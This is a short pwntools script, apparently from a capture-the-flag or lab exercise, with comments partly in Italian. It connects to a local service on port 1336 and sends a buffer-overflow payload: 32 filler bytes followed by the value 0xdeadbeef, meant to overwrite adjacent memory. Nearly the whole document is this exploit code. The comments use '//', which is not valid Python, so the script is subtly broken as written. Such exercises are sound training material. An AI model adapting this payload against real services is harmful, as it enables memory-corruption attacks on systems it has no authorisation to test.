**SCRIPT**
```python
from pwn import *
connect = remote('127.0.0.1', 1336)
print(connect.recvn(18)) //bytes that you receive
payload = "A"*32 //riempi il buffer
payload += p32(0xdeadbeef) //aggiungi ciò che ti serve
connect.send(payload)
print(connect.recvn(34)) //ricevi i byte che ti serve ricevere
```